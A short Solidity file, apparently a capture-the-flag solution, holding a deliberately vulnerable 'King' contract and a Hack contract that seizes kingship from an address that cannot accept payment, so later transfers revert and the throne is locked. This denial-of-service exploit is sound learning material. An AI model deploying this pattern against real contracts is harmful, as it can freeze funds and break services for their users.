// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

// goal:When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.


contract Hack{
    constructor(address payable _target) payable {
        (bool ok,) = _target.call{value:msg.value}("");
        require(ok,"failed");
    }

}

// create a smart contract claim the king 
// dont have any way to accept payment so the .transver will wail 
// not writing recive / fall back is same as 
// receive() external payable {
//     revert("nope!");
// }
// fallback() external payable {
//     revert("nope!");
// }